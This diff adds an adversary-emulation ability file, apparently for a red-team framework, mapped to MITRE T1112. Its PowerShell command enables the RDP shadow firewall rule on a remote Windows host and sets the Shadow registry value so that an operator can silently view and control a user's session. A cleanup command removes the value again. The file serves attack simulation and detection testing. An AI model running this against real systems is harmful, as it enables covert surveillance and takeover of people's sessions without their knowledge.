@@ -1,0 +1,36 @@
+---
+- id: 447e9221c5adaf37139d05ea53eb7ca2
+  name: Setting Shadow key in Registry for RDP Shadowing
+  description: "Microsoft Remote Desktop Protocol (RDP) supports a \u201Cshadowing\u201D\
+    \ feature and RDP is available in all Windows Server Operating Systems and the\
+    \ business editions of end-user Windows versions.\nIn order to use the RDP shadowing\
+    \ feature, the Remote Desktop Services (TermService) service needs to be running\
+    \ (which it does by default), a rule needs to be enabled in the Windows Firewall\
+    \ and in case of stealth reasons, a setting needs to be configured to not prompt\
+    \ the user for permission when they are being shadowed.\nIn order to configure\
+    \ RDP shadowing session in a quiet mode.  The registry of a remote system can\
+    \ be updated using several protocols, depending on the accessible ports and configuration\
+    \ of the services listening on those ports. Our aim is to set the Shadow value\
+    \ in HKLM\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services on the\
+    \ remote machine to 2, which allows us to both view and control the session without\
+    \ the user being informed.\n[Reference](https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing)"
+  tactic: multiple
+  technique:
+    attack_id: T1112
+    name: Modify Registry
+  platforms:
+    windows:
+      psh:
+        command: $s= New-CimSession -Computername; Get-CimInstance -Namespace ROOT\StandardCimv2
+          -ClassName MSFT_NetFirewallRule -Filter 'DisplayName="Remote Desktop - Shadow
+          (TCP-In)"' -CimSession $s | Invoke-CimMethod -MethodName Enable; Invoke-CimMethod
+          -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650;
+          sSubKeyName="Software\Policies\Microsoft\Windows NT\Terminal Services";
+          sValueName="shadow"; uValue=[uint32]2} -CimSession $s
+        payloads: []
+        cleanup: Invoke-CimMethod -ClassName StdRegProv -MethodName DeleteValue -Arguments
+          @{hDefKey=[uint32]2147483650; sSubKeyName="Software\Policies\Microsoft\Windows
+          NT\Terminal Services"; sValueName="Shadow"} -CimSession $s
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
